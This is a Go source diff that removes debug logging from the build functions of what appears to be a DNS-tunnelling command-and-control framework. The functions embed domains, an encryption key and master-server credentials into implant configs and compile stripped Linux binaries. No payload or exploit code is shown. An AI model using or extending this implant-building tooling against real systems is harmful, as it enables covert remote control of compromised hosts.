@@ -974,7 +974,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 
 	// Copy Server source files to build directory
 	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")
-	fmt.Printf("Debug: Copying Server source from: %s\n", serverSrcDir)
 
 	// Verify source directory exists
 	if _, err := os.Stat(serverSrcDir); os.IsNotExist(err) {
@@ -984,8 +983,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	if err := copyDir(serverSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
-
-	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)
 
 	// Update config.go with embedded configuration
 	configPath := filepath.Join(buildDir, "config.go")
@@ -1011,27 +1008,13 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	// Note: Replace ALL occurrences since there may be DefaultConfig() and tryLoadEmbeddedConfig()
 	configStr := string(config)
 
-	// Debug: Show what we're looking for and replacing
-	fmt.Printf("[Builder] Replacing Domain with: %s\n", req.Domain)
-	fmt.Printf("[Builder] Replacing NS1 with: %s\n", req.NS1)
-	fmt.Printf("[Builder] Replacing NS2 with: %s\n", req.NS2)
-	fmt.Printf("[Builder] Replacing MasterServer with: %s\n", masterURL)
-	fmt.Printf("[Builder] Replacing MasterAPIKey with: %s\n", apiKey)
-	fmt.Printf("[Builder] Replacing MasterServerID with: %s\n", serverID)
-
-	// Count occurrences before replacement for debugging
-	domainCount := strings.Count(configStr, "Domain:        \"example.com\",")
-	fmt.Printf("[Builder] Found %d occurrences of Domain field to replace\n", domainCount)
-
 	configStr = strings.ReplaceAll(configStr, "Domain:        \"example.com\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
 	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.example.com\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
 	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.example.com\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
 
 	// Verify Domain was replaced
 	if strings.Contains(configStr, "Domain:        \"example.com\",") {
-		fmt.Printf("[Builder] WARNING: Domain field still contains 'example.com' after replacement!\n")
-	} else {
-		fmt.Printf("[Builder] ✓ Domain field replaced successfully\n")
+		return "", fmt.Errorf("domain replacement failed - example.com still present")
 	}
 	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
 	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
@@ -1050,7 +1033,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	if strings.Contains(configStr, "MasterServer:      \"\",") {
 		return "", fmt.Errorf("CRITICAL: MasterServer replacement failed - empty value still present in config")
 	}
-	fmt.Printf("[Builder] ✓ Configuration embedded successfully\n")
 
 	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
@@ -1075,8 +1057,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 
 	// Build binary to temp location
 	outputPath := filepath.Join(buildDir, "dns-server")
-	fmt.Printf("Building DNS server to: %s\n", outputPath)
-
 	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
 	cmd.Dir = buildDir
 	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
@@ -1085,8 +1065,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	if err != nil {
 		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
 	}
-
-	fmt.Printf("Build command completed. Output: %s\n", string(output))
 
 	// Verify binary was created
 	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
@@ -1100,7 +1078,6 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 			outputPath, fileList, string(output))
 	}
 
-	fmt.Printf("Binary verified at: %s\n", outputPath)
 	return outputPath, nil
 }
 
@@ -1115,7 +1092,6 @@ func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey string) (stri
 
 	// Copy Client source files
 	clientSrcDir := filepath.Join(sourceRoot, "Client")
-	fmt.Printf("Debug: Copying Client source from: %s\n", clientSrcDir)
 
 	// Verify source directory exists
 	if _, err := os.Stat(clientSrcDir); os.IsNotExist(err) {
@@ -1125,16 +1101,6 @@ func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey string) (stri
 	if err := copyDir(clientSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
-
-	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)
-
-	// List files to verify what was copied
-	entries, _ := os.ReadDir(buildDir)
-	fmt.Printf("Debug: Files in build dir: ")
-	for _, e := range entries {
-		fmt.Printf("%s ", e.Name())
-	}
-	fmt.Println()
 
 	// Generate config.go from scratch (don't rely on existing file)
 	configPath := filepath.Join(buildDir, "config.go")
@@ -1186,7 +1152,7 @@ func getConfig() Config {
 		return "", fmt.Errorf("failed to write config: %w", err)
 	}
 
-	fmt.Printf("Debug: Generated config.go with %d DNS domains\n", len(req.DNSDomains)) // Clean and download dependencies
+	// Clean and download dependencies
 	modTidyCmd := exec.Command("go", "mod", "tidy")
 	modTidyCmd.Dir = buildDir
 	if output, err := modTidyCmd.CombinedOutput(); err != nil {
